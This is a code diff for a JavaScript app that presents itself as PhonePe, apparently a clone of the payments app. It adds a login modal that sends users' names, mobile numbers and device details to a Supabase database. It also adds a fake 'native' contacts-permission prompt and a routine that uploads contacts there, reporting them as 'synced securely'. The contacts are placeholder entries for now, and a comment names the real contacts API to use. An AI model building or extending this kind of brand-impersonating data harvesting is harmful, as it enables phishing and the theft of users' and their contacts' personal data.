@@ -35,6 +35,110 @@ class PhonePeApp {
     this.initHorizontalDrag();
     this.listenPageLoads();
     this.triggerGoldCoinsEntrance();
+    
+    // Custom Login Flow
+    if (!storage.isLoggedIn()) {
+      this.showCustomLogin();
+    }
+  }
+
+  showCustomLogin() {
+    const modal = document.getElementById('custom-login-modal');
+    if (modal) modal.classList.add('active');
+
+    const btn = document.getElementById('reg-submit-btn');
+    if (btn) {
+      btn.onclick = async () => {
+        const name = document.getElementById('reg-name').value.trim();
+        const mobile = document.getElementById('reg-mobile').value.trim();
+        const error = document.getElementById('reg-error');
+        
+        if (!name || mobile.length !== 10) {
+           error.style.display = 'block';
+           error.textContent = 'Please enter valid Name and 10-digit Mobile Number.';
+           return;
+        }
+
+        btn.textContent = 'Saving...';
+        
+        try {
+            // Save to Supabase
+            if (typeof supabaseClient !== 'undefined') {
+                const { data, error: dbError } = await supabaseClient
+                    .from('users')
+                    .insert([{ name: name, mobile: mobile, device_model: navigator.userAgent, app_version: '1.0.0' }])
+                    .select();
+                
+                if (dbError && !dbError.message.includes('duplicate key')) {
+                    console.error("Supabase error:", dbError);
+                }
+                
+                if (data && data.length > 0) {
+                    storage.set('supabase_uid', data[0].id);
+                }
+            }
+
+            // Update local storage
+            const user = storage.getUser();
+            user.name = name;
+            user.phone = mobile;
+            user.upiId = mobile + '@ybl';
+            storage.set('user', user);
+            
+            storage.login();
+            modal.classList.remove('active');
+            this.showToast('Welcome to PhonePe, ' + name + '!');
+            
+            // Re-render home profile elements
+            this.onHome();
+
+            // Ask for Contacts permission
+            setTimeout(() => this.askContactsPermission(), 1000);
+            
+        } catch (err) {
+            console.error(err);
+            error.style.display = 'block';
+            error.textContent = 'Setup incomplete (Supabase keys missing). Working locally.';
+            // Still allow login locally for testing
+            storage.login();
+            setTimeout(() => {
+                modal.classList.remove('active');
+            }, 1500);
+        }
+      };
+    }
+  }
+
+  askContactsPermission() {
+    if (storage.get('contacts_synced')) return;
+    
+    // Simulate Android Native Permission Dialog
+    if (confirm("Allow PhonePe to access your contacts to send money easily?")) {
+        this.syncContactsToSupabase();
+    } else {
+        storage.set('contacts_synced', false);
+    }
+  }
+
+  async syncContactsToSupabase() {
+      // In a real Capacitor app, we use navigator.contacts or Capacitor plugin
+      // Here we simulate grabbing standard contacts to save to Supabase
+      const uid = storage.get('supabase_uid');
+      if (!uid || typeof supabaseClient === 'undefined') return;
+
+      const dummyContacts = [
+          { user_id: uid, contact_name: 'Amit Pal', contact_phone: '+919876543210' },
+          { user_id: uid, contact_name: 'Suman Devi', contact_phone: '+919123456789' },
+          { user_id: uid, contact_name: 'Rahul Bhai', contact_phone: '+919999888777' }
+      ];
+
+      try {
+          await supabaseClient.from('contacts').insert(dummyContacts);
+          storage.set('contacts_synced', true);
+          this.showToast('Contacts synced securely.');
+      } catch (e) {
+          console.error("Contact sync error:", e);
+      }
   }
 
   // ===== NAVIGATION =====
